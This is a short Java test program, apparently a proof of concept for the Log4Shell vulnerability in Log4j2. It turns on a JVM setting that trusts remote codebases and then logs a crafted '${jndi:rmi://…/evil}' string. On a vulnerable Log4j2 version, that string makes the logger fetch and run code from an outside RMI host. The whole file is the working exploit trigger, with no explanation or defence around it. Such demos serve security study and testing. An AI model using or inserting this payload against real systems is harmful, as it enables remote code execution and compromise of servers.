package com.halibobo.log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Test {

  private static final Logger Logger = LogManager.getLogger();

  public static void main(String[] args) {
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

    String username = "${jndi:rmi://192.168.20.219:1099/evil}";
    Logger.info("hello, {}" ,username);
  }
}
